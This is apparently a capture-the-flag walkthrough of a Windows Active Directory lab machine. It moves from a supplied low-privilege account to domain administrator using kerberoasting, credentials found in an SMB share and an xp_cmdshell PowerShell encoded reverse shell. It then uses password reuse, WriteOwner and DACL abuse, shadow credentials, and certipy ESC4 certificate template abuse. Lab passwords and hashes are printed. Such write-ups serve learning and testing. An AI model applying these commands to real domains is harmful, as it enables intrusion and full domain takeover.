Shell as sql_svc

 

As is common in real life Windows pentests, you will start this box with credentials for the following account:

rose:KxEPkKe6R8su

 

 

First I grab bloodhound data

netexec ldap 10.10.11.51 -u rose -p KxEPkKe6R8su --bloodhound -c all --dns-server 10.10.11.51

 

 

These 3 users can be kerberoasted

 

 

We can use the creds from rose to get the hashes but we are unable to crack them

impacket-GetUserSPNs -dc-ip 10.10.11.51 sequel.htb/rose -request

 

 

 

 

I missed it intially but theres an accounting share

 

 

We can mount the share for easier access

sudo mount -t cifs '//10.10.11.51/accounting department' smb -o username=rose,password=KxEPkKe6R8su
 

 

 

these files are actually zip files

 

Once we extract it we find creds

xl/sharedStrings.xml

 

angela 0fwz7Q4mSpurIt99 
oscar 86LxLBMgEWaKUnBG 
kevin Md9Wlq1E5bZnVDVo 
sa@sequel.htb MSSQLP@ssw0rd!

 

 

With this we can login to the DB

 

One liner to enable xp_cmdshell so we can execute commands

EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';
 

 

With this enabled we can execute system commands. Below we see the whoami command executes

 

Getting a shell

Convert shell to base64

cat shell.ps1 | iconv -t utf-16le | base64 -w 0
 

Then use that base64 output to trigger the shell

xp_cmdshell PowerShell.exe -Exec ByPass -Nol -Enc <base64 encoded shell>

 

 

 

Shell as Ryan

Using the list of usernames above we see oscar has a valid login but this ends up being useless

netexec smb 10.10.11.51 -u users.txt -p pass.txt --continue-on-success

oscar:86LxLBMgEWaKUnBG

 

 

Password found for sql_svc C:\SQL2019\ExpressAdv_ENU\SETUP.EXE.CONFIG

sql_svc:WqSZAF6CysDQbGb3

 

 

The sql_svc password doesnt end up helping much.

I try the password for password reuse and sure enough its reused by ryan.

 

ryan:WqSZAF6CysDQbGb3

 

Grab user flag

evil-winrm -i 10.10.11.51 -u ryan -p WqSZAF6CysDQbGb3
 

 

 

Access to ca_svc

 

Ryan has write owner over ca_svc

Abuse Write Owner

bloodyAD --host '10.10.11.51' -d 'sequel.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan' 
[+] Old owner S-1-5-21-548670397-972687484-3496335370-512 is now replaced by ryan on ca_svc
 

impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"

[*] DACL backed up to dacledit-20250114-133124.bak
[*] DACL modified successfully!
 

certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'

Shell as Administrator

 

Using certipy-ad we can search for vulnerable templates

certipy-ad find -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -dc-ip 10.10.11.51 -vulnerable -enabled -old-bloodhound

 

Looking at the output there is a ESC4 vulnerability

 

 

This link was  helpful for exploiting ESC4

https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/

 

We can abuse this by following the steps below.

 


certipy-ad template -dc-ip 10.10.11.51 -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -target dc01.sequel.htb


Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
                                                                                                                   

                                                            
certipy-ad req -u ca_svc -hashes ':3b181b914e7a9d5508ea1e20bc2b7fce' -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug

Remote in with admin hash
